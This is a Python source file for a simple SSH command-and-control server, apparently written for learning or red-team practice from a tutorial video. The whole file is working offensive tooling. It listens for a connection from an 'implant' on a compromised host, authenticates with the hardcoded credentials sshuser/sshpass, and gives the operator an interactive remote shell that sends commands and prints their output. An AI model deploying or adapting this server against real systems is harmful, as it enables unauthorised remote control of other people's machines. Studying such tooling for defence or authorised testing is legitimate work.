#!/usr/bin/env python3
#Basic python C2 Server
#https://github.com/zweilosec
#based on Joe Helle's video https://www.youtube.com/watch?v=iP7eFbZPgss&list=PLJQHPJLj_SQb0gxh3kCeEurfwPtreQazg

import paramiko #ssh library
import argparse
import socket
import os
from colorama import Fore, Style, init

#Parse arguments from the command line
parser = argparse.ArgumentParser(description='A simple Python SSH C2 Server.')
parser.add_argument('server', help='An IP address or hostname', nargs='?', const=1, default='0.0.0.0')
parser.add_argument('port', help='The port to serve SSH on.', nargs='?', const=1, type=int, default=2222)
parser.add_argument('-i', '--keyfile',help='The ed25519 SSH keyfile to use.', nargs='?', const=1, default='python_c2.key')
parser.add_argument('-v', '--verbose', action='store_true')
args = parser.parse_args()

def createStyle():
    global success, informational, warning, fail, normal
    success, informational, warning, fail, normal = Fore.GREEN + Style.NORMAL, Fore.CYAN + Style.NORMAL, Fore.YELLOW + Style.DIM, Fore.RED + Style.BRIGHT, Fore.WHITE + Style.NORMAL

def verbose_print(to_print):
    if args.verbose:
        print(warning + to_print)

class sshServer (paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            verbose_print('[DEBUG] open succeeded')
            return paramiko.OPEN_SUCCEEDED
            
        else:
            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
        
    def check_auth_password(self, username, password):
        if (username == 'sshuser') and (password == 'sshpass'):
            verbose_print('[DEBUG] auth success')
            return paramiko.AUTH_SUCCESSFUL
        else:
            verbose_print('[DEBUG] auth failed')
            return paramiko.AUTH_FAILED

def main(server,port,keyfile):
    cwd = os.getcwd()
    HOSTKEY = paramiko.Ed25519Key(filename=os.path.join(cwd, keyfile))
    #HOSTKEY = paramiko.RSAKey(filename=os.path.join(cwd, 'id_rsa'))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print(informational + 'Listening for connections from implant...')
        client, addr = sock.accept()

    except KeyboardInterrupt:
        print(warning + '\nCtrl-C detected. Exiting...')
        quit()
    
    SSH_SESSION = paramiko.Transport(client)
    SSH_SESSION.add_server_key(HOSTKEY)
    server = sshServer()
    SSH_SESSION.start_server(server=server)
    
    chan = SSH_SESSION.accept()
    if chan is None:
        print(fail + 'Channel error. Exiting.')
        quit()
    verbose_print(f'[DEBUG] {chan}') #debug check

    success_message = chan.recv(1024).decode()
    print(success + f'{success_message}')
    chan.send('\n') #single byte keep alive

    def get_prompt():
        chan.send('whoami; hostname; pwd') #not the best way to do this...but works!
        user,hostname,pwd = chan.recv(1024).decode().split() #decode() is necessary to convert bytestream to string
        prompt = (f'({user}@{hostname})-[{pwd}]>') #prompt for shell in format: (username@hostname)-[current/directory]>
        return prompt

    def comm_handler():
        try:
            while True:
                cmd_line = get_prompt()

                command = input(informational + cmd_line + '' + success) #get user input, displaying the above prompt

                if command == '':
                    continue
                if command == 'exit':
                    print(warning + 'Shutting down C2 server...')
                    chan.send(command)
                    shutdown_message = chan.recv(8192)
                    print(success + shutdown_message.decode())
                    quit()
                else:
                    chan.send(command)
                    return_value = chan.recv(8192)
                    print(normal + return_value.decode())
                    continue

        except Exception as e:
            print(str(e))
            pass
        except KeyboardInterrupt:
            print(warning + '\nCtrl-C detected. Exiting...')
            chan.send('exit')
            return_value = chan.recv(1024)
            print(warning + return_value.decode())
            quit()

    comm_handler()

if __name__ == "__main__":
    init()
    createStyle()
    main(args.server, args.port, args.keyfile)
